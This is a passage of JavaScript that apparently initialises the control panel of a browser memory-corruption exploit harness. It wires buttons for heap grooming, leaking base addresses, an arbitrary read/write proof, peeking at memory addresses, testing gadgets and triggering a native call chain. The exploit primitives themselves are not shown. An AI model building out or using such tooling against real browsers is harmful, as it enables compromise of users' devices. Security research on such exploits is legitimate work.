    btnNative = $("btn-native");
    btnPeek = $("btn-peek");
    btnClear = $("btn-clear");

    if (!outEl || !btnStart) {
        state("UI missing — open via HTTP(S), not file://", "bad");
        return;
    }

    wireGadgetBars();
    wireClick(btnStart, function () { return runStart(); });
    wireClick(btnSaveBases, saveBasesManual);
    wireClick(btnRwProof, function () { return runRwProofManual(); });
    wireClick(btnNative, function () { return runNativeCall(); });
    wireClick(btnClear, function () {
        lines.length = 0;
        clearPersistedLog();
        if (outEl) outEl.textContent = "";
        mark("LOG-CLEAR", "sessionStorage log cleared");
    });
    wireClick(btnPeek, function () {
        const a = parseAddr(addrIn.value);
        if (!a) { mark("PEEK-FAIL", "bad hex"); return; }
        peekAt(a);
    });

    if (pickPtr) {
        pickPtr.addEventListener("change", function () {
            const i = parseInt(pickPtr.value, 10);
            if (!(i >= 0) || !pointers[i]) return;
            addrIn.value = pointers[i].addr.replace(/^0x/i, "");
        });
    }

    if (params.get("clearlog") === "1") clearPersistedLog();
    else if (RESTORE_LOG && restorePersistedLog()) renderOut();

    mark("BOOT", "build=" + BUILD_ID + " — manual steps only (primitive auto-retries)");
    mark("BOOT", groomBootLine(params));
    window.addEventListener("beforeunload", function () {
        if (stateEl) persistState(stateEl.textContent, stateEl.className);
        if (nativeChain) try { nativeChain.disarm(); } catch (_) { }
    });
    wireGroomBar(() => busy);
    setUi();
    state("ready — groom → Start → Save bases → test gadgets one-by-one", "");
}

function bootUi() {
    try {
        init();
    } catch (err) {
        reportErr(err);
    }
}

if (document.readyState === "loading")
    document.addEventListener("DOMContentLoaded", bootUi);
else
    bootUi();
